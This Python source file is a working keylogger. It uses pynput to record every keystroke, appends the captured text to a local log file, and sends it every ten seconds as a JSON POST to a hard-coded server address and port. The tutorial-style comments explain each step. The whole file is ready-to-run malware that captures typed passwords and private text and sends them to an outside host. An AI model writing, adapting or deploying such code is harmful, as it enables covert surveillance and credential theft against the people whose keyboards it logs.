from pynput import keyboard
import threading
# We need to import the requests library to Post the data to the server.
import requests
# To transform a Dictionary to a JSON string we need the json package.
import json

log_file = "keylogs.txt"
text = ""
time_interval = 10

# Hard code the values of your server and ip address here.
ip_address = "172.19.234.130"
port_number = "8080"

def add_to_file():
    global text
    try:
        with open(log_file, "a") as f:
            f.writelines(f'{text}')
            text = ""
        # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
        timer = threading.Timer(time_interval, add_to_file)
        # We start the timer thread.
        timer.start()
    except:
        print("error")

def send_post_req():
    try:
        # We need to convert the Python object into a JSON string. So that we can POST it to the server. Which will look for JSON using
        # the format {"keyboardData" : "<value_of_text>"}
        payload = json.dumps({"keyboardData" : text})
        # We send the POST Request to the server with ip address which listens on the port as specified in the Express server code.
        # Because we're sending JSON to the server, we specify that the MIME Type for JSON is application/json.
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
    except:
        print("Couldn't complete request!")

def keylog():
    send_post_req()
    add_to_file()
    # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
    timer = threading.Timer(time_interval, keylog)
    # We start the timer thread.
    timer.start()

def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += " {Key.Enter} \n"
    elif key == keyboard.Key.tab:
        text += " {Key.Tab} "
    elif key == keyboard.Key.space:
        text += " {Key.Space} "
    elif key == keyboard.Key.shift:
        text += " {Key.Shift} "
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text += " {Key.Backspace} "
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        text += " {Key.Ctrl} "
    elif key == keyboard.Key.right:
        text += " {Key.right}"
    elif key == keyboard.Key.left:
        text += " {Key.left}"
    elif key == keyboard.Key.up:
        text += " {Key.up}"
    elif key == keyboard.Key.down:
        text += " {Key.down}"
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")
 

# Start listening in the background
listener = keyboard.Listener(on_press=on_press)
listener.start()
keylog()
# Keep the script running
input("Keylogger running... Press Esc to stop.\n")

